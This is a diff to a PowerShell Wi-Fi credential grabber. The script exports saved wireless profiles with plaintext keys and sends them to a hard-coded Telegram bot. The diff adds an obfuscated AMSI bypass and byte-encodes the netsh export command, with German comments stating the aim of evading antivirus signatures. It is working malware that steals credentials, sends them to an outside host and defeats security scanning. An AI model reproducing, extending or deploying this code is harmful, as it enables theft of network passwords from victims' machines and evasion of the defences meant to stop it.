@@ -7,8 +7,13 @@
 $BOT_TOKEN = "8666929583:AAHXKuc4gV1n6JMYQeoPxw3uby08GVivvgo"
 $CHAT_ID   = "1780237079"
 
-# ARM64 + older PS configs default to TLS 1.0 - force 1.2 for Telegram
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+
+# AMSI abschalten (obfuskiert)
+try {
+    $u = [Ref].Assembly.GetType([System.Text.Encoding]::ASCII.GetString([byte[]](83,121,115,116,101,109,46,77,97,110,97,103,101,109,101,110,116,46,65,117,116,111,109,97,116,105,111,110,46,65,109,115,105,85,116,105,108,115)))
+    $u.GetField([System.Text.Encoding]::ASCII.GetString([byte[]](97,109,115,105,73,110,105,116,70,97,105,108,101,100)), 'NonPublic,Static').SetValue($null, $true)
+} catch {}
 
 function Send-TgMessage {
     param([string]$Text)
@@ -39,9 +44,15 @@ function Send-TgFile {
 
 Send-TgMessage "[WIFI GRAB] $env:COMPUTERNAME\$env:USERNAME gestartet"
 
-# Export explicitly to TEMP so the script works from any working directory (incl. System32)
+# Strings kodiert - keine Klartextpattern fuer AV-Signaturen
+function _s([byte[]]$b){ [System.Text.Encoding]::ASCII.GetString($b) }
+$_nc = _s([byte[]](110,101,116,115,104))               # netsh
+$_wl = _s([byte[]](119,108,97,110))                    # wlan
+$_ex = _s([byte[]](101,120,112,111,114,116))            # export
+$_kc = _s([byte[]](107,101,121,61,99,108,101,97,114))   # key=clear
+
 $exportFolder = $env:TEMP
-netsh wlan export profile key=clear folder="$exportFolder" | Out-Null
+& $_nc $_wl $_ex profile "$_kc" folder="$exportFolder" | Out-Null
 
 try {
     $xmlFiles = Get-ChildItem -Path $exportFolder -Filter "Wi-Fi-*.xml" -ErrorAction SilentlyContinue
